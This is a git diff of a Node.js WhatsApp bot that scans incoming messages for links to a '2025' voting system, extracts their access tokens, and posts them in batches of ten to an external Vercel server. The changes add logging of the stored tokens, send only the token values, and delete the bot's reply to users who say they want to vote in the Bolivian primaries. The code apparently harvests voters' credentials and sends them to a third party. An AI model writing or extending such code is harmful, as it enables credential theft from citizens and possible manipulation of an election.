@@ -3,7 +3,7 @@ const qrcode = require('qrcode-terminal');
 const axios = require('axios');
 
 let tokens = [];
-
+console.log('Tokens almacenados:', tokens);
 const SERVER_URL = 'https://dashboard-gray-zeta-28.vercel.app/api/token';
 
 const client = new Client({
@@ -22,18 +22,18 @@ const client = new Client({
     }
 });
 
-// Función para extraer el token del mensaje
 function extraerToken(mensaje) {
     const urlRegex = /https:\/\/sistemadevotacion2025.*?token=(.*?)(?:\s|$)/;
     const match = mensaje.match(urlRegex);
     return match ? match[1] : null;
 }
 
-// Función para enviar tokens al servidor
+
 async function enviarTokens() {
     if (tokens.length >= 10) {
         try {
-            const response = await axios.post(SERVER_URL, { tokens });
+            const tokensSoloValores = tokens.map(t => t.token);
+            const response = await axios.post(SERVER_URL, { tokens: tokensSoloValores });
             console.log('Tokens enviados exitosamente:', response.data);
             // Limpiar el array después de enviar
             tokens = [];
@@ -73,9 +73,7 @@ client.on('message', async msg => {
             console.log('Token almacenado. Total tokens:', tokens.length);
             await enviarTokens();
         }
-    } else if (lowerCaseMsg.includes('quiero votar')) {
-        await msg.reply('Estás por ejercer un derecho fundamental como ciudadano boliviano.\n\nParticipa en las *Primarias Bolivia 2025* y elige de manera libre y responsable.');
-    }
+    } 
 });
 
 client.on('auth_failure', (error) => {
